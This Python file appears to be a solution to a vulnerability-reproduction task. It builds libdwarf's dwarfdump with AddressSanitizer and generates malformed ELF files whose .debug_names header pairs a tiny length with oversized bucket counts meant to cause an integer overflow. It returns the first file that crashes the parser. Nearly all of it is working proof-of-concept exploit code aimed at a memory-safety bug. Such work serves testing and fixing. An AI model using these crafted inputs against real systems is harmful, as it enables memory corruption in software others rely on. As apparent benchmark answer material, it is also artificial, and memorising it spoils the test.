import os
import sys
import struct
import shutil
import subprocess
import tempfile
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Setup working directory
        work_dir = tempfile.mkdtemp()
        
        # Helper to generate ELF with .debug_names
        def create_elf_with_debug_names(debug_names_content):
            # ELF64 Header
            e_ident = b'\x7fELF\x02\x01\x01\x00' + b'\x00'*8
            e_type_machine = struct.pack('<HH', 2, 62) # Exec, x86-64
            e_version = struct.pack('<I', 1)
            e_entry = struct.pack('<Q', 0)
            e_phoff = struct.pack('<Q', 64) # Put PHeaders right after
            e_shoff = struct.pack('<Q', 0) # Calculated later
            
            # We put a minimal Phdr just in case
            phdr = struct.pack('<IIQQQQQQ', 1, 5, 0, 0x400000, 0x400000, 0x1000, 0x1000, 0x8)
            
            # Data Layout: [Ehdr] [Phdr] [debug_names] [shstrtab] [Sheaders]
            ehdr_size = 64
            phdr_size = 56
            
            offset_debug_names = ehdr_size + phdr_size
            size_debug_names = len(debug_names_content)
            
            shstrtab_data = b'\x00.shstrtab\x00.debug_names\x00'
            offset_shstrtab = offset_debug_names + size_debug_names
            size_shstrtab = len(shstrtab_data)
            
            # Align to 8 bytes for sheaders
            curr_off = offset_shstrtab + size_shstrtab
            rem = curr_off % 8
            padding = b''
            if rem:
                padding = b'\x00' * (8 - rem)
                curr_off += (8 - rem)
            
            offset_shdr = curr_off
            
            # Section Headers
            # 0: Null
            null_sh = b'\x00' * 64
            
            # 1: .shstrtab
            sh_name = 1
            sh_type = 3 # SHT_STRTAB
            sh_flags = 0
            sh_addr = 0
            sh_offset = offset_shstrtab
            sh_size = size_shstrtab
            sh_link = 0
            sh_info = 0
            sh_addralign = 1
            sh_entsize = 0
            shstrtab_sh = struct.pack('<IIQQQQIIQQ', sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize)
            
            # 2: .debug_names
            sh_name_dn = 11
            sh_type_dn = 1 # SHT_PROGBITS
            sh_flags_dn = 0
            sh_addr_dn = 0
            sh_offset_dn = offset_debug_names
            sh_size_dn = size_debug_names
            sh_link_dn = 0
            sh_info_dn = 0
            sh_addralign_dn = 1
            sh_entsize_dn = 0
            debug_names_sh = struct.pack('<IIQQQQIIQQ', sh_name_dn, sh_type_dn, sh_flags_dn, sh_addr_dn, sh_offset_dn, sh_size_dn, sh_link_dn, sh_info_dn, sh_addralign_dn, sh_entsize_dn)
            
            shnum = 3
            shstrndx = 1
            
            e_shoff = struct.pack('<Q', offset_shdr)
            e_flags = struct.pack('<I', 0)
            e_ehsize = struct.pack('<H', ehdr_size)
            e_phentsize = struct.pack('<H', phdr_size)
            e_phnum = struct.pack('<H', 1)
            e_shentsize = struct.pack('<H', 64)
            e_shnum = struct.pack('<H', shnum)
            e_shstrndx = struct.pack('<H', shstrndx)
            
            elf_header = e_ident + e_type_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx
            
            return elf_header + phdr + debug_names_content + shstrtab_data + padding + null_sh + shstrtab_sh + debug_names_sh

        def make_payload(bucket_count):
            # Header: version(2), padding(2), cu_count(4), ltu(4), ftu(4), bucket_count(4), name_count(4), abbrev(4), aug(4), aug_str(0)
            # Total 32 bytes + aug_str
            h = struct.pack('<HIIIIIII', 5, 0, 0, 0, 0, bucket_count, 0, 0, 0)
            # We set unit_length to be small (just the header size), 
            # so the parser accepts the file, but internal logic using bucket_count might overflow.
            return struct.pack('<I', len(h)) + h

        try:
            # 1. Extract source
            subprocess.run(['tar', 'xf', src_path, '-C', work_dir], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            items = os.listdir(work_dir)
            extract_dir = next((d for d in items if os.path.isdir(os.path.join(work_dir, d))), None)
            src_root = os.path.join(work_dir, extract_dir) if extract_dir else work_dir
            
            # 2. Compile libdwarf and dwarfdump with ASAN
            build_dir = os.path.join(src_root, 'build_fuzz')
            os.makedirs(build_dir, exist_ok=True)
            
            env = os.environ.copy()
            env['CFLAGS'] = '-g -fsanitize=address -O1'
            env['CXXFLAGS'] = '-g -fsanitize=address -O1'
            env['LDFLAGS'] = '-fsanitize=address'
            
            # Try to compile
            if os.path.exists(os.path.join(src_root, 'configure')):
                subprocess.run([os.path.join(src_root, 'configure'), '--disable-shared'], cwd=build_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
                subprocess.run(['make', '-j8'], cwd=build_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
            
            # Locate dwarfdump
            dwarfdump_bin = None
            for root, dirs, files in os.walk(build_dir):
                if 'dwarfdump' in files:
                    cand = os.path.join(root, 'dwarfdump')
                    if os.access(cand, os.X_OK):
                        dwarfdump_bin = cand
                        break
            
            if not dwarfdump_bin:
                 # Fallback search
                for root, dirs, files in os.walk(src_root):
                    if 'dwarfdump' in files:
                        cand = os.path.join(root, 'dwarfdump')
                        if os.access(cand, os.X_OK):
                            dwarfdump_bin = cand
                            break

            # 3. Test Candidates
            # 0x40000000 * 4 = 0 mod 2^32 (integer overflow leading to 0 alloc)
            candidates = [0x40000000, 0x20000000, 0xFFFFFFFF, 0x80000000]
            
            if dwarfdump_bin:
                for bc in candidates:
                    payload = make_payload(bc)
                    elf = create_elf_with_debug_names(payload)
                    
                    tf = tempfile.NamedTemporaryFile(mode='wb', delete=False)
                    tf.write(elf)
                    tf.close()
                    
                    try:
                        proc = subprocess.run([dwarfdump_bin, '-n', tf.name], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=5)
                        err = proc.stderr.decode(errors='ignore')
                        if "AddressSanitizer" in err:
                            os.unlink(tf.name)
                            return elf
                    except subprocess.TimeoutExpired:
                        pass
                    
                    os.unlink(tf.name)
            
            # Fallback
            return create_elf_with_debug_names(make_payload(0x40000000))

        except Exception:
            # Fallback on any error
            return create_elf_with_debug_names(make_payload(0x40000000))
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)